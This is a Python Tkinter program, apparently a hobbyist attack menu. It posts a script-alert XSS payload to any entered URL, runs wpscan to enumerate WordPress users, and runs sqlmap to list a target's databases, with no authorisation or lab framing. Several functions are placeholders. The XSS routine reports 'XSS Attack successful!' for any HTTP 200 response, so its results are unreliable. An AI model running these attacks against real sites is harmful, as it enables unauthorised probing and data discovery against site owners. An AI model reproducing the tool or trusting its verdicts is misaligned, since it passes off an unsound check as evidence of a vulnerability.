import tkinter as tk
from tkinter import simpledialog, messagebox
import subprocess
import os
import requests

class MenuGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Menu")
        self.root.geometry("300x300")

        self.menu_label = tk.Label(self.root, text="Select from the menu:")
        self.menu_label.pack()

        self.menu_options = tk.Listbox(self.root)
        options = [
            "Information Gathering",
            "XSS Tracer",
            "Wordpress",
            "SQL-injection",
            "tesssstte",
            "Generate Report",
            "Exit"
        ]
        for option in options:
            self.menu_options.insert(tk.END, option)
        self.menu_options.pack()

        self.select_button = tk.Button(self.root, text="Select", command=self.handle_selection)
        self.select_button.pack()

    def handle_selection(self):
        selection = self.menu_options.curselection()
        if selection:
            choice = self.menu_options.get(selection)
            if choice == "Information Gathering":
                self.info()
            elif choice == "XSS Tracer":
                self.perform_xss_attack()
            elif choice == "Wordpress":
                self.wpscan_scan()
            elif choice == "SQL-injection":
                self.sqlmap_attack()
            elif choice == "tesssstte":
                self.tesssstte_function()
            elif choice == "Generate Report":
                self.generate_report_dialog()
            elif choice == "Exit":
                self.root.destroy()

    def generate_report_dialog(self):
        category = simpledialog.askstring("Generate Report", "Enter report category:")
        if category:
            self.generate_report(category)

    def generate_report(self, category):
        report_filename = f"{category}_report.html"
        with open(report_filename, "w") as report_file:
            report_file.write(f"<html><head><title>{category} Report</title></head><body>")
            report_file.write(f"<h1>{category} Report</h1>")
            report_file.write("<p>This is a dummy report. Replace it with actual content.</p>")
            report_file.write("</body></html>")
        messagebox.showinfo("Report Generated", f"HTML report for {category} has been generated: {report_filename}")

    def perform_xss_attack(self):
        url = simpledialog.askstring("XSS Tracer", "Enter the URL to perform XSS attack on:")
        if url:
            # Define the XSS payload
            payload = "<script>alert('XSS Attack!')</script>"

            # Create the form data with the XSS payload
            form_data = {
                "input_field": payload
            }

            print(f"Sending POST request to: {url}")
            print(f"Data: {form_data}")

            try:
                # Send the POST request with the form data
                response = requests.post(url, data=form_data)

                # Print the response headers
                print(f"Response Headers: {response.headers}")

                # Check if the request was successful
                if response.status_code == 200:
                    print("XSS Attack successful!")
                else:
                    print("XSS Attack failed. Status code:", response.status_code)
            except requests.exceptions.RequestException as e:
                print("An error occurred:", e)

    def wpscan_scan(self):
        site_url = simpledialog.askstring("Wordpress", "Enter the Wordpress site URL:")
        if site_url:
            try:
                # Exécute WPScan avec l'URL du site WordPress fournie en argument
                subprocess.run(["wpscan", "--url", site_url, "--enumerate", "u", "--ignore-main-redirect", "--wp-content-dir", "/path/to/wp-content"])
            except FileNotFoundError:
                print("WPScan n'a pas été trouvé sur votre système. Assurez-vous qu'il est installé et accessible dans votre chemin d'exécution.")

    def info(self):
        print("Info function not implemented yet.")

    def sqlmap_attack(self):
        url = simpledialog.askstring("SQLMap", "Enter the URL to perform SQLMap attack on:")
        if url:
            try:
                # Exécuter SQLMap avec l'URL fournie en argument
                subprocess.run(["sqlmap", "-u", url, "--dbs"])
            except FileNotFoundError:
                print("SQLMap n'a pas été trouvé sur votre système. Assurez-vous qu'il est installé et accessible dans votre chemin d'exécution.")

    def tesssstte_function(self):
        messagebox.showinfo("tesssstte", "tesssstte feature will be implemented soon.")

    def clearScr(self):
        subprocess.run("cls" if os.name == "nt" else "clear", shell=True)

    def menu(self):
        print("Menu function not implemented yet.")

root = tk.Tk()
menu_gui = MenuGUI(root)
root.mainloop()